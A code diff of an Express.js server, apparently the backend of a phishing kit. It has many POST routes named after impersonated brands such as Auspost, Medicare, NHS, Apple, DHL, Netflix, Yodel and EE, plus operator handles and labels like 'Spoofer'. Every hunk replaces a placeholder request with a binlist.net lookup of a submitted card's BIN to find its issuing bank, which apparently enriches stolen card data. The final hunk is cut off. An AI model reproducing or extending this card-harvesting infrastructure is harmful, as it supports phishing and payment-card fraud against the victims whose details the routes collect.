@@ -2853,7 +2853,7 @@ app.post("/mko2", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -2965,7 +2965,7 @@ app.post("/serenityO2", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -3077,7 +3077,7 @@ app.post("/charlieO2", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -3189,7 +3189,7 @@ app.post("/saimO2", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -3301,7 +3301,7 @@ app.post("/c2O2", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -3413,7 +3413,7 @@ app.post("/o2Triz", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -3541,7 +3541,7 @@ app.post("/eeAuspost", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -3655,7 +3655,7 @@ app.post("/truthAuspost", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -3757,7 +3757,7 @@ app.post("/fredAuspost", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -3859,7 +3859,7 @@ app.post("/trentAuspost", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -3961,7 +3961,7 @@ app.post("/biggieAuspost", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4063,7 +4063,7 @@ app.post("/consistentAuspost", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4167,7 +4167,7 @@ app.post("/bigbullAuspost", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4269,7 +4269,7 @@ app.post("/daangerAuspost", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4373,7 +4373,7 @@ app.post("/c2auspost", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4475,7 +4475,7 @@ app.post("/ausPostSJ", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4547,7 +4547,7 @@ app.post("/ausPostKelv2", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4649,7 +4649,7 @@ app.post("/ausPostManny", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4724,7 +4724,7 @@ app.post("/ausPostAbzz", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4799,7 +4799,7 @@ app.post("/ausPostSS", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4875,7 +4875,7 @@ app.post("/ausPostTheOnlyMY", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -4953,7 +4953,7 @@ app.post("/ausPostfrankabignale100!", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5029,7 +5029,7 @@ app.post("/ausPostAR", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5095,7 +5095,7 @@ app.post("/ausPostKelv", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5172,7 +5172,7 @@ app.post("/ausPostSpoofer", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5247,7 +5247,7 @@ app.post("/ausPostLoader", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5324,7 +5324,7 @@ app.post("/fredMedicare", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5430,7 +5430,7 @@ app.post("/tarrifiMedicare", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5511,7 +5511,7 @@ app.post("/MZ7Medicare", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5592,7 +5592,7 @@ app.post("/putinMedicare", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5673,7 +5673,7 @@ app.post("/failedlawyerMedicare", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5754,7 +5754,7 @@ app.post("/codeNbaMedicare", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5835,7 +5835,7 @@ app.post("/ssMedicare", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5914,7 +5914,7 @@ app.post("/offshorebillionsMedicare", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -5993,7 +5993,7 @@ app.post("/haytchMedicare", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6062,7 +6062,7 @@ app.post("/kelvMedicare", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6143,7 +6143,7 @@ app.post("/masonDHL", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6227,7 +6227,7 @@ app.post("/fpaysNetflix", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6315,7 +6315,7 @@ app.post("/sendYodelRes", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6401,7 +6401,7 @@ app.post("/sendSSYodelres", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6480,7 +6480,7 @@ app.post("/yodelM4STERB0Y", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6556,7 +6556,7 @@ app.post("/sendARRYodelRes", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6639,7 +6639,7 @@ app.post("/mazzaYodel", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6726,7 +6726,7 @@ app.post("/yardzYodel", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6812,7 +6812,7 @@ app.post("/hoodsYodel", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6898,7 +6898,7 @@ app.post("/sendBigBillz20", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -6977,7 +6977,7 @@ app.post("/sendKelvYodelRes", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -7063,7 +7063,7 @@ app.post("/c2EE", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -7172,7 +7172,7 @@ app.post("/eeKelv", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -7255,7 +7255,7 @@ app.post("/nzpostFirst", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -7914,7 +7914,7 @@ app.post("/kelvAppleSpain", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -8027,7 +8027,7 @@ app.post("/johnAppleAu", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -8148,7 +8148,7 @@ app.post("/kelvAppleAu", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -8269,7 +8269,7 @@ app.post("/osbAppleAu", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -8378,7 +8378,7 @@ app.post("/fredAppleAu", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -8487,7 +8487,7 @@ app.post("/t1AppleAu", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -8606,7 +8606,7 @@ app.post("/stackerApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -8715,7 +8715,7 @@ app.post("/pweightApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -8830,7 +8830,7 @@ app.post("/dpApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -8945,7 +8945,7 @@ app.post("/rondoApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -9054,7 +9054,7 @@ app.post("/ghostApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -9169,7 +9169,7 @@ app.post("/smokedApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -9278,7 +9278,7 @@ app.post("/trizApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -9360,7 +9360,7 @@ app.post("/tcapzApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -9471,7 +9471,7 @@ app.post("/fasterpaymApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -9582,7 +9582,7 @@ app.post("/blacktescoApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -9697,7 +9697,7 @@ app.post("/yardzApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -9812,7 +9812,7 @@ app.post("/osbApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -9929,7 +9929,7 @@ app.post("/cyaApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -10034,7 +10034,7 @@ app.post("/heisenbergApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -10151,7 +10151,7 @@ app.post("/pabloApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -10268,7 +10268,7 @@ app.post("/sendMazzaAppleRes", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -10358,7 +10358,7 @@ app.post("/sendStrictlyAppleRes", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -10452,7 +10452,7 @@ app.post("/applePasteBk", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -10567,7 +10567,7 @@ app.post("/applePoka", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -10684,7 +10684,7 @@ app.post("/appleFirstTrust", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -10799,7 +10799,7 @@ app.post("/appleSB", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -10889,7 +10889,7 @@ app.post("/appleP2", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -11006,7 +11006,7 @@ app.post("/spooferGooferApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -11093,7 +11093,7 @@ app.post("/kelvApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -11182,7 +11182,7 @@ app.post("/swipesApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -11270,7 +11270,7 @@ app.post("/daangerApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -11357,7 +11357,7 @@ app.post("/fpaysApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -11472,7 +11472,7 @@ app.post("/ciscoApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -11560,7 +11560,7 @@ app.post("/onlymyApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -11649,7 +11649,7 @@ app.post("/nchroApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -11762,7 +11762,7 @@ app.post("/chasedabag24s", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -11853,7 +11853,7 @@ app.post("/baliApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12053,7 +12053,7 @@ app.post("/ciscoNHS", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12152,7 +12152,7 @@ app.post("/rolloNHS", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12251,7 +12251,7 @@ app.post("/cyaNHS", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12338,7 +12338,7 @@ app.post("/sendKelvFriendResTwo", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12417,7 +12417,7 @@ app.post("/@kworthy1", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12493,7 +12493,7 @@ app.post("/stillrunning", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12571,7 +12571,7 @@ app.post("/spoofergooferNHS", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12637,7 +12637,7 @@ app.post("/nhsMason", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12714,7 +12714,7 @@ app.post("/@kworthy12", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12790,7 +12790,7 @@ app.post("/Tarrifi", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12863,7 +12863,7 @@ app.post("/littlewaynesjobs", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12936,7 +12936,7 @@ app.post("/sendKelvFriendRes", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13014,7 +13014,7 @@ app.post("/sendFpays2", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13089,7 +13089,7 @@ app.post("/M4STERB0Y", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13164,7 +13164,7 @@ app.post("/skiii719", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13236,7 +13236,7 @@ app.post("/Tcapz688", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13309,7 +13309,7 @@ app.post("/actualTcapz688", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13384,7 +13384,7 @@ app.post("/mannyman789", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13459,7 +13459,7 @@ app.post("/mulligang135", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13534,7 +13534,7 @@ app.post("/lingypackNHS", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13626,7 +13626,7 @@ app.post("/energySYM", async (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13725,7 +13725,7 @@ app.post("/energyBlackTesco", async (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13824,7 +13824,7 @@ app.post("/energySerenity", async (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13923,7 +13923,7 @@ app.post("/energyBali", async (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -14022,7 +14022,7 @@ app.post("/energyGYMU", async (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -14121,7 +14121,7 @@ app.post("/energyStacker", async (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -14220,7 +14220,7 @@ app.post("/energyCDB", async (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -14319,7 +14319,7 @@ app.post("/energyGhost", async (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -14418,7 +14418,7 @@ app.post("/energyManny", async (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
+    .get(`https://lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -14517,7 +14517,7 @@ app.post("/energyDP", async (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://google.com/`)
